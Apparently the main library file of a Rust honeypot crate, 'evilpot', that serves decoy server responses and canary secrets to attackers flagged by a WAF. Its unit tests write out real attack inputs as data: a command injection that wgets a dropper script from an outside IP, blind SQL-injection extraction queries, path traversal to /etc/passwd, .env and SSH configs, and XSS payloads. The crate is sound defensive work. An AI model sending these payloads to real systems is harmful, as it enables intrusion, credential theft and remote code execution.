//! # evilpot
//!
//! **Embeddable zero-copy HTTP deception, exploit verification & tarpit honeypot crate for Rust.**
//!
//! `evilpot` is designed to be embedded directly inside an existing Rust gateway, WAF, or reverse proxy
//! (such as `Exposure` or `evilpot-forefront`).
//!
//! ## Architecture & Division of Responsibility
//!
//! - **`evilpot` does NOT perform attack detection.** The caller's WAF (e.g. Exposure's `waf.rs` or
//!   `evilpot-forefront`'s `sigil-filter` inspector) identifies suspicious or malicious requests and
//!   diverts them into `evilpot` along with an [`AttackSignal`].
//! - **Tailored Deception & Exploit Verification**: Instead of returning a static `403 Forbidden`,
//!   `evilpot` serves a deterministic, rotating server persona matching the attacker's probe
//!   (SQLi error/boolean/time-blind targets, fake `.env`/`.git/config`, WordPress suite, SSRF AWS IMDSv1,
//!   SSTI evaluation, NoSQL/LDAP/XXE leaks, stateful in-memory `FakeShellSession` for RCE, or 256 MiB
//!   slow-drip tarpit streams) and tracks whether the attacker actively exploits the vulnerability:
//!   1. **Implanted Canary Token / Path Replay** (`ExploitVerificationStatus::VerifiedExploit`):
//!      Every decoy payload embeds session-bound canary API keys (`epk_...`), AWS keys (`AKIA...`),
//!      cookies, and a secret vault export route (`/api/v1/internal/vault-export/...`). If the client
//!      replays any of these in a subsequent request, `evilpot` immediately confirms 100% real exploitation.
//!   2. **Multi-Step Interaction & IOC Extraction**:
//!      Tracks SQLMap character-by-character blind extraction, stateful RCE shell command chaining &
//!      malware download URLs (`wget`/`curl`/file writes), and multi-path LFI reconnaissance.
//!   3. **Sustained Tarpit Consumption**:
//!      Monitors how many bytes and milliseconds a client spends reading from a slow-drip `.sql.gz` or
//!      `heapdump` tarpit stream, distinguishing accidental clicks from automated data-exfiltration tools.

pub mod config;
pub mod engine;
pub mod http;
pub mod layer;
pub mod persona;
pub mod shell;
pub mod trap;

pub use config::{AdminPanelConfig, EvilpotConfig};
pub use engine::{
    AttackerSessionReport, EvilpotEngine, EvilpotMetrics, EvilpotMetricsSnapshot,
    ExploitVerificationStatus, TarpitPermit, ThreatEvent, VerificationEvidence,
};
pub use http::{
    build_trap_http_response, full_body, inject_persona_headers, DeceptionOutcome, EvilpotBody,
    TarpitDripBody,
};
pub use layer::{extract_client_ip, EvilpotLayer, EvilpotService, IntoResponseBody};
pub use persona::{PersonaSnapshot, PrebakedPersona, ShellVfsData};
pub use shell::{FakeShellSession, ShellExecResult};
pub use trap::{
    extract_injected_command, percent_decode_lossy, select_trap_for_signal, AttackCategory,
    AttackSignal, LfiTargetHint, TarpitKind, TrapVerdict,
};

#[cfg(test)]
mod tests {
    use super::*;
    use ::http::{HeaderMap, HeaderValue};
    use http_body_util::BodyExt;
    use std::net::IpAddr;

    #[test]
    fn test_randomized_and_custom_admin_url_prefix() {
        let default_cfg = EvilpotConfig::default();
        let eng1 = EvilpotEngine::new(default_cfg.clone());
        let eng2 = EvilpotEngine::new(default_cfg);
        assert!(eng1.admin_path_prefix().starts_with("/_ep_"));
        assert_eq!(eng1.admin_path_prefix().len(), 37);
        assert_ne!(eng1.admin_path_prefix(), eng2.admin_path_prefix());

        let mut custom_cfg = EvilpotConfig::default();
        custom_cfg.admin.path_prefix =
            "/__my_secret_ops_panel_9f8a7c2e1b4d603f5a1c8e9d2b7410a/".to_string();
        let eng_custom = EvilpotEngine::new(custom_cfg);
        assert_eq!(
            eng_custom.admin_path_prefix(),
            "/__my_secret_ops_panel_9f8a7c2e1b4d603f5a1c8e9d2b7410a"
        );
    }

    #[test]
    fn test_deterministic_persona_sharding_and_rotation() {
        let mut cfg = EvilpotConfig::default();
        cfg.persona_slots = 8;
        let engine = EvilpotEngine::new(cfg);

        let ip1: IpAddr = "203.0.113.10".parse().unwrap();
        let ip2_same_subnet: IpAddr = "203.0.113.250".parse().unwrap();

        let p1 = engine.select_persona(ip1);
        let p2 = engine.select_persona(ip2_same_subnet);

        assert_eq!(p1.epoch_id, 1);
        assert_eq!(p1.slot_id, p2.slot_id);
        assert_eq!(p1.hostname, p2.hostname);
        assert_eq!(p1.dotenv_body, p2.dotenv_body);

        let new_snap = engine.rotate_now();
        assert_eq!(new_snap.epoch_id, 2);

        let p1_after = engine.select_persona(ip1);
        assert_eq!(p1_after.epoch_id, 2);
        assert_ne!(p1.dotenv_body, p1_after.dotenv_body);
    }

    #[tokio::test]
    async fn test_exposure_waf_signal_diversion_and_canary_verification() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let attacker_ip: IpAddr = "198.51.100.42".parse().unwrap();
        let headers = HeaderMap::new();

        // Step 1: Exposure WAF catches an LFI / secret leak probe and diverts it into evilpot
        let sig = AttackSignal::from_waf_finding(
            "path-traversal",
            "query",
            0.95,
            vec!["dot_dot_slash".into()],
        )
        .with_payload("file=../../../../.env");

        let outcome1 = engine
            .handle_attack(
                attacker_ip,
                "GET",
                "/download",
                Some("file=../../../../.env"),
                &headers,
                sig,
            )
            .await;

        assert_eq!(
            outcome1.session.status,
            ExploitVerificationStatus::Probing
        );
        let body_bytes = outcome1
            .response
            .into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes();
        let body_str = std::str::from_utf8(&body_bytes).unwrap();

        let persona = engine.select_persona(attacker_ip);
        assert!(body_str.contains(&persona.canary_api_key));
        assert!(body_str.contains(&persona.canary_endpoint_path));

        // Step 2: Attacker extracts the fake `ADMIN_BYPASS_TOKEN` from `.env` and uses it in Authorization header!
        // Even if this second request looks syntactically benign to the WAF, `handle_canary_if_present` catches it
        // and upgrades the session to `VerifiedExploit`!
        let mut follow_up_headers = HeaderMap::new();
        follow_up_headers.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {}", persona.canary_api_key)).unwrap(),
        );
        let canary_outcome = engine
            .handle_canary_if_present(
                attacker_ip,
                "GET",
                "/api/v1/users",
                None,
                &follow_up_headers,
            )
            .await
            .expect("should detect replayed canary API token");

        assert_eq!(
            canary_outcome.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert_eq!(canary_outcome.session.canary_triggers, 1);
        assert_eq!(engine.metrics_snapshot().canary_verifications, 1);
        assert_eq!(engine.metrics_snapshot().verified_attack_sessions, 1);
    }

    #[tokio::test]
    async fn test_multi_step_sqlmap_and_stateful_rce_verification() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let attacker_ip: IpAddr = "203.0.113.88".parse().unwrap();
        let persona = engine.select_persona(attacker_ip);
        let headers = HeaderMap::new();

        // 1. SQLMap boolean-blind character extraction at pos 1 and pos 2 -> upgrades to VerifiedExploit
        let c1 = persona.db_secret_row.as_bytes()[0];
        let q1 = format!(
            "id=1 AND ORD(MID((SELECT password FROM users LIMIT 0,1),1,1))>{}",
            c1 - 1
        );
        let sig1 = AttackSignal::new(AttackCategory::SqlInjection, "query", 0.92).with_payload(&q1);
        let out1 = engine
            .handle_attack(attacker_ip, "GET", "/item", Some(&q1), &headers, sig1)
            .await;
        assert_eq!(
            out1.verdict,
            TrapVerdict::SqlInjectionBoolean {
                truthy: true,
                extracted_pos: Some(1)
            }
        );

        let c2 = persona.db_secret_row.as_bytes()[1];
        let q2 = format!(
            "id=1 AND ORD(MID((SELECT password FROM users LIMIT 0,1),2,1))>{}",
            c2
        );
        let sig2 = AttackSignal::new(AttackCategory::SqlInjection, "query", 0.92).with_payload(&q2);
        let out2 = engine
            .handle_attack(attacker_ip, "GET", "/item", Some(&q2), &headers, sig2)
            .await;
        assert_eq!(
            out2.verdict,
            TrapVerdict::SqlInjectionBoolean {
                truthy: false,
                extracted_pos: Some(2)
            }
        );
        assert_eq!(
            out2.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert_eq!(out2.session.sqli_distinct_positions, 2);

        // 2. Command injection RCE with malware download URL -> captures IOC in session report
        let rce_ip: IpAddr = "198.51.100.99".parse().unwrap();
        let rce_payload = "host=127.0.0.1; wget http://198.51.100.200/dropper.sh -O /tmp/a.sh";
        let rce_sig = AttackSignal::new(AttackCategory::CommandInjection, "query", 0.98)
            .with_payload(rce_payload);
        let rce_out = engine
            .handle_attack(rce_ip, "GET", "/ping", Some(rce_payload), &headers, rce_sig)
            .await;
        assert_eq!(
            rce_out.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert!(rce_out
            .session
            .captured_iocs
            .iter()
            .any(|ioc| ioc.contains("http://198.51.100.200/dropper.sh")));
    }

    #[tokio::test]
    async fn test_tarpit_sustained_read_verifies_attacker() {
        let mut cfg = EvilpotConfig::default();
        cfg.tarpit_verify_min_bytes = 128;
        cfg.tarpit_drip_bytes_per_sec = 1024;
        let engine = EvilpotEngine::new(cfg);
        let ip: IpAddr = "203.0.113.199".parse().unwrap();
        let headers = HeaderMap::new();

        let sig = AttackSignal::new(AttackCategory::TarpitArchiveProbe, "path", 0.90);
        let outcome = engine
            .handle_attack(ip, "GET", "/backup.sql.gz", None, &headers, sig)
            .await;
        assert_eq!(outcome.session.status, ExploitVerificationStatus::Probing);

        // Pull first frame from TarpitDripBody (256 bytes >= 128 byte threshold)
        let mut body = outcome.response.into_body();
        let frame = body.frame().await.unwrap().unwrap();
        assert!(frame.data_ref().unwrap().len() >= 128);

        let updated = engine.session_report(ip).unwrap();
        assert_eq!(updated.status, ExploitVerificationStatus::VerifiedExploit);
        assert!(updated.tarpit_bytes_consumed >= 128);
    }

    #[tokio::test]
    async fn test_persona_stability_distinct_lfi_xss_reflection_gzip_and_independent_secrets() {
        let mut cfg = EvilpotConfig::default();
        cfg.server_header = Some("nginx".to_string());
        cfg.emit_persona_headers = false;
        let engine = EvilpotEngine::new(cfg);
        let ip: IpAddr = "198.51.100.123".parse().unwrap();
        let headers = HeaderMap::new();

        // 1. Identity & Server header stay consistent across rotation and match edge proxy config
        let p_before = engine.select_persona(ip);
        engine.rotate_now();
        let p_after = engine.select_persona(ip);
        assert_eq!(p_before.hostname, p_after.hostname);
        assert_eq!(p_before.server_header, p_after.server_header);

        let xss_sig = AttackSignal::new(AttackCategory::Xss, "query", 0.95)
            .with_payload("<svg onload=alert(1)>");
        let xss_out = engine
            .handle_attack(ip, "GET", "/search", Some("q=%3Csvg%20onload%3Dalert(1)%3E"), &headers, xss_sig)
            .await;
        assert_eq!(xss_out.response.headers().get("server").unwrap(), "nginx");
        assert!(xss_out.response.headers().get("x-powered-by").is_none());
        assert!(xss_out.response.headers().get("x-backend-node").is_none());
        let set_cookie = xss_out
            .response
            .headers()
            .get("set-cookie")
            .unwrap()
            .to_str()
            .unwrap()
            .to_string();
        let xss_body = String::from_utf8(
            xss_out.response.into_body().collect().await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        assert!(xss_body.contains("<svg onload=alert(1)>"), "XSS payload must be reflected verbatim");
        assert!(!xss_body.contains(&p_after.canary_api_key), "XSS page must not leak .env API key");

        // 2. Distinct LFI files return distinct content (never all /etc/passwd)
        let mut lfi_bodies = Vec::new();
        for path in [
            "../../../../etc/passwd",
            "../../../../etc/hostname",
            "../../../../etc/ssh/sshd_config",
            "../../../../.git/config",
        ] {
            let sig = AttackSignal::new(AttackCategory::PathTraversal, "query", 0.95)
                .with_payload(format!("file={path}"));
            let out = engine
                .handle_attack(ip, "GET", "/dl", Some(&format!("file={path}")), &headers, sig)
                .await;
            assert_eq!(out.response.status(), 200);
            lfi_bodies.push(out.response.into_body().collect().await.unwrap().to_bytes());
        }
        for i in 0..lfi_bodies.len() {
            for j in (i + 1)..lfi_bodies.len() {
                assert_ne!(lfi_bodies[i], lfi_bodies[j], "LFI files {i} and {j} must differ");
            }
        }
        assert!(std::str::from_utf8(&lfi_bodies[2]).unwrap().contains("PermitRootLogin"));
        assert!(std::str::from_utf8(&lfi_bodies[3]).unwrap().contains("[remote \"origin\"]"));

        // 3. Command injection handles ;id;#, ;ls, ;echo
        for (q, expect) in [
            ("host=127.0.0.1;id;#", "uid=1000"),
            ("host=127.0.0.1;ls", "deploy_notes.txt"),
            ("host=127.0.0.1;echo hello_rce", "hello_rce"),
        ] {
            let sig = AttackSignal::new(AttackCategory::CommandInjection, "query", 0.95).with_payload(q);
            let out = engine
                .handle_attack(ip, "GET", "/ping", Some(q), &headers, sig)
                .await;
            let txt = String::from_utf8(
                out.response.into_body().collect().await.unwrap().to_bytes().to_vec(),
            )
            .unwrap();
            assert!(txt.contains(expect), "expected `{expect}` for `{q}`, got `{txt}`");
        }

        // 4. Independent secrets & zero `epk_` / `canary` / `example.com` leakage
        let env_out = engine
            .handle_attack(
                ip,
                "GET",
                "/.env",
                None,
                &headers,
                AttackSignal::new(AttackCategory::SecretLeakProbe, "path", 0.99),
            )
            .await;
        let env_txt = String::from_utf8(
            env_out.response.into_body().collect().await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        let jndi_out = engine
            .handle_attack(
                ip,
                "GET",
                "/api",
                None,
                &headers,
                AttackSignal::new(AttackCategory::Deserialization, "header:user-agent", 0.95),
            )
            .await;
        let jndi_txt = String::from_utf8(
            jndi_out.response.into_body().collect().await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        for txt in [&env_txt, &jndi_txt, &xss_body] {
            let low = txt.to_ascii_lowercase();
            assert!(!low.contains("epk_"));
            assert!(!low.contains("canary"));
            assert!(!low.contains("example.com"));
        }
        assert!(!jndi_txt.contains(&p_after.canary_api_key));
        assert!(!jndi_txt.contains(&p_after.canary_aws_access_key));

        // 5. Gzip tarpit starts with valid gzip header + DEFLATE stored block
        let gz_out = engine
            .handle_attack(
                ip,
                "GET",
                "/backup.sql.gz",
                None,
                &headers,
                AttackSignal::new(AttackCategory::TarpitArchiveProbe, "path", 0.99),
            )
            .await;
        let mut gz_body = gz_out.response.into_body();
        let first_frame = gz_body.frame().await.unwrap().unwrap();
        let bytes = first_frame.data_ref().unwrap();
        assert_eq!(&bytes[..4], &[0x1f, 0x8b, 0x08, 0x00]);
        assert_eq!(bytes[10], 0x00); // DEFLATE stored block (BTYPE=00)
        let len = u16::from_le_bytes([bytes[11], bytes[12]]);
        let nlen = u16::from_le_bytes([bytes[13], bytes[14]]);
        assert_eq!(len ^ nlen, 0xffff);

        // 6. admin_session_id from XSS works across rotation and renders Admin Panel HTML (200, never 302)
        engine.rotate_now();
        let cookie_kv = set_cookie.split(';').next().unwrap().trim();
        let mut admin_hdrs = HeaderMap::new();
        admin_hdrs.insert("cookie", HeaderValue::from_str(cookie_kv).unwrap());
        admin_hdrs.insert("accept", HeaderValue::from_static("text/html"));
        let admin_out = engine
            .handle_canary_if_present(ip, "GET", "/admin", None, &admin_hdrs)
            .await
            .expect("admin_session_id must trigger across rotation");
        assert_eq!(admin_out.response.status(), 200);
        let admin_html = String::from_utf8(
            admin_out.response.into_body().collect().await.unwrap().to_bytes().to_vec(),
        )
        .unwrap();
        assert!(admin_html.contains("Admin Console"));
    }

    #[tokio::test]
    async fn test_repeated_identical_probe_never_escalates_to_multistep() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let ip: IpAddr = "203.0.113.41".parse().unwrap();
        let headers = HeaderMap::new();
        let payload = "id=1'";

        let first = engine
            .handle_attack(
                ip,
                "GET",
                "/item",
                Some(payload),
                &headers,
                AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9).with_payload(payload),
            )
            .await;
        assert_eq!(first.session.status, ExploitVerificationStatus::Probing);

        // Retrying the exact same request (e.g. a legitimate user hitting a WAF false
        // positive) must never count as multi-step progress.
        for _ in 0..3 {
            let again = engine
                .handle_attack(
                    ip,
                    "GET",
                    "/item",
                    Some(payload),
                    &headers,
                    AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9)
                        .with_payload(payload),
                )
                .await;
            assert_eq!(
                again.session.status,
                ExploitVerificationStatus::Probing,
                "identical retries must not escalate"
            );
        }
    }

    #[tokio::test]
    async fn test_distinct_sqli_payloads_and_technique_switches_escalate() {
        // Two different SQLi payloads of the same flavour -> multi-step.
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let ip: IpAddr = "203.0.113.42".parse().unwrap();
        let headers = HeaderMap::new();
        for payload in ["id=1'", "id=2'"] {
            engine
                .handle_attack(
                    ip,
                    "GET",
                    "/item",
                    Some(payload),
                    &headers,
                    AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9)
                        .with_payload(payload),
                )
                .await;
        }
        let report = engine.session_report(ip).unwrap();
        assert!(report.status >= ExploitVerificationStatus::MultiStepExploitation);
        assert_eq!(
            report.sqli_distinct_positions, 0,
            "no blind extraction position was recovered"
        );

        // Switching from SQLi to XSS is also multi-step.
        let engine2 = EvilpotEngine::new(EvilpotConfig::default());
        let ip2: IpAddr = "203.0.113.43".parse().unwrap();
        engine2
            .handle_attack(
                ip2,
                "GET",
                "/item",
                Some("id=1'"),
                &headers,
                AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9).with_payload("id=1'"),
            )
            .await;
        engine2
            .handle_attack(
                ip2,
                "GET",
                "/search",
                Some("q=<script>alert(1)</script>"),
                &headers,
                AttackSignal::new(AttackCategory::Xss, "query", 0.9)
                    .with_payload("<script>alert(1)</script>"),
            )
            .await;
        let report2 = engine2.session_report(ip2).unwrap();
        assert!(report2.status >= ExploitVerificationStatus::MultiStepExploitation);
    }

    #[tokio::test]
    async fn test_multi_step_distinct_request_threshold_is_configurable() {
        // Require 4 distinct attack requests before multi-step escalation (default is 2).
        let mut cfg = EvilpotConfig::default();
        cfg.multi_step_min_distinct_requests = 4;
        let engine = EvilpotEngine::new(cfg);
        let ip: IpAddr = "203.0.113.45".parse().unwrap();
        let headers = HeaderMap::new();

        for payload in ["id=1'", "id=2'", "id=3'"] {
            let out = engine
                .handle_attack(
                    ip,
                    "GET",
                    "/item",
                    Some(payload),
                    &headers,
                    AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9)
                        .with_payload(payload),
                )
                .await;
            assert_eq!(
                out.session.status,
                ExploitVerificationStatus::Probing,
                "3 distinct requests are below the configured threshold of 4"
            );
        }

        let payload = "id=4'";
        let out = engine
            .handle_attack(
                ip,
                "GET",
                "/item",
                Some(payload),
                &headers,
                AttackSignal::new(AttackCategory::SqlInjection, "query", 0.9)
                    .with_payload(payload),
            )
            .await;
        assert_eq!(
            out.session.status,
            ExploitVerificationStatus::MultiStepExploitation,
            "the 4th distinct request must reach the configured threshold"
        );
    }

    #[tokio::test]
    async fn test_repeated_rce_command_does_not_escalate_but_distinct_commands_do() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let ip: IpAddr = "203.0.113.44".parse().unwrap();
        let headers = HeaderMap::new();
        let repeated = "host=127.0.0.1; id";
        for _ in 0..3 {
            let out = engine
                .handle_attack(
                    ip,
                    "GET",
                    "/ping",
                    Some(repeated),
                    &headers,
                    AttackSignal::new(AttackCategory::CommandInjection, "query", 0.98)
                        .with_payload(repeated),
                )
                .await;
            assert_eq!(out.session.status, ExploitVerificationStatus::Probing);
        }

        let second = "host=127.0.0.1; whoami";
        let out = engine
            .handle_attack(
                ip,
                "GET",
                "/ping",
                Some(second),
                &headers,
                AttackSignal::new(AttackCategory::CommandInjection, "query", 0.98)
                    .with_payload(second),
            )
            .await;
        assert_eq!(
            out.session.status,
            ExploitVerificationStatus::MultiStepExploitation
        );
    }
}
